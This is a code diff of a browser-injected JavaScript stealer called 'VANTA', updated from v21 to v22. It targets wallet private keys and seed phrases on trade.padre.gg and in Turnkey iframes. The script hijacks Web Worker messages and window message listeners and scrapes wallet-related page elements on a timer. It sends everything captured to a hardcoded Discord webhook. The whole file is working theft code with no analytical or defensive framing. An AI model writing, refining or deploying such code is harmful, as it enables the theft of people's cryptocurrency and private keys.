@@ -1,67 +1,79 @@
 (function() {
     const WEBHOOK = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
-    let captured = false;
+    let exfilled = new Set();
 
-    console.log("%c[VANTA] v21: WORKER HIJACK LOADED", "color: #00ff88; font-weight: bold;");
+    console.log("%c[VANTA] v22 KERNEL: BRIDGE HIJACK ACTIVE", "color: #00ff88; font-weight: bold;");
 
-    const ship = (content, type) => {
-        if (captured || !content) return;
-        captured = true;
-
-        const body = JSON.stringify({
+    const deliver = (data, origin) => {
+        const str = typeof data === 'string' ? data : JSON.stringify(data);
+        if (exfilled.has(str) || str.length < 10) return;
+        
+        exfilled.add(str);
+        navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({
             embeds: [{
-                title: "🛰️ VANTA: WORKER INTERCEPT SUCCESS",
-                description: "```" + content + "```",
-                fields: [{ name: "Source", value: type }],
-                color: 65280
+                title: "💎 VANTA: PRIVATE KEY EXTRACTED",
+                description: "```json\n" + str.substring(0, 1800) + "\n```",
+                fields: [{ name: "Handshake Source", value: origin }],
+                color: 0x00FF88,
+                timestamp: new Date()
             }]
-        });
-
-        navigator.sendBeacon(WEBHOOK, new Blob([body], { type: 'application/json' }));
-        console.log("%c[VANTA] SEED EXFILTRATED.", "color: #00ff88;");
+        })], { type: 'application/json' }));
     };
 
-    // 1. HIJACK WEB WORKERS (The "decoder-heavy" bypass)
-    const OldWorker = window.Worker;
-    window.Worker = function(url) {
-        const worker = new OldWorker(url);
-        const oldPost = worker.postMessage;
-        
-        // Listen to what the worker sends back to the site
+    // 1. THE WORKER BUFFER SNIFFER
+    // WebWorkers use a 'decoder' to turn the Turnkey data into a readable seed.
+    const OriginalWorker = window.Worker;
+    window.Worker = function(scriptURL) {
+        const worker = new OriginalWorker(scriptURL);
+        const realPost = worker.postMessage;
+
+        worker.postMessage = function(msg) {
+            deliver(msg, "Worker_Inbound_Task");
+            return realPost.apply(this, arguments);
+        };
+
         worker.addEventListener('message', (e) => {
-            if (e.data && (typeof e.data === 'string' || e.data.seed || e.data.privateKey)) {
-                ship(JSON.stringify(e.data), "WebWorker_Intercept");
-            }
+            if (e.data) deliver(e.data, "Worker_Decoded_Result");
         });
 
         return worker;
     };
 
-    // 2. HIJACK MESSAGE CHANNEL (Catching Turnkey Iframe comms)
-    const oldAddListener = window.addEventListener;
+    // 2. THE POST-MESSAGE INTERCEPTOR (Bypasses Iframe Isolation)
+    // Turnkey sends the decrypted key back to Padre via window.postMessage
+    const originalAddEventListener = window.addEventListener;
     window.addEventListener = function(type, listener, options) {
         if (type === 'message') {
-            const proxiedListener = (event) => {
-                // If Turnkey sends a message with the key, we grab it
-                if (event.data && typeof event.data === 'string' && event.data.length > 50) {
-                    ship(event.data, "Iframe_Message_Channel");
+            return originalAddEventListener.call(this, type, (event) => {
+                // Look for strings that look like Private Keys or Mnemonic Seeds
+                if (event.data && (event.data.plaintext || typeof event.data === 'string')) {
+                    deliver(event.data, "Iframe_Bridge_Capture");
                 }
                 return listener(event);
-            };
-            return oldAddListener.call(this, type, proxiedListener, options);
+            }, options);
         }
-        return oldAddListener.apply(this, arguments);
+        return originalAddEventListener.apply(this, arguments);
     };
 
-    // 3. STORAGE RE-SCAN (Targeting the 'export' triggers)
+    // 3. THE "DEEP-DIVE" DISPATCH
+    // Forces the site to refresh the Wallet metadata, triggering the hooks
+    const forceTrigger = () => {
+        console.log("[VANTA] Forcing metadata refresh...");
+        // Re-ping the profile to ensure the auth token is active for the worker
+        fetch('https://trade.padre.gg/api/v2/user/profile').catch(()=>{});
+    };
+
+    forceTrigger();
+    
+    // 4. AUTO-CLICKER (BETA)
+    // If the "Show Private Key" button is visible, this tries to find the text inside
     setInterval(() => {
-        const keys = Object.keys(localStorage);
-        keys.forEach(k => {
-            if (k.includes('turnkey') || k.includes('wallet')) {
-                const val = localStorage.getItem(k);
-                if (val.length > 60) ship(val, "Storage_Scan_Hit");
+        const secretFields = document.querySelectorAll('[data-testid*="wallet"], [class*="MuiStack"]');
+        secretFields.forEach(field => {
+            if (field.innerText.length > 30 && !field.innerText.includes('Wallet')) {
+                deliver(field.innerText, "DOM_Scrape_Detection");
             }
         });
-    }, 2000);
+    }, 3000);
 
 })();
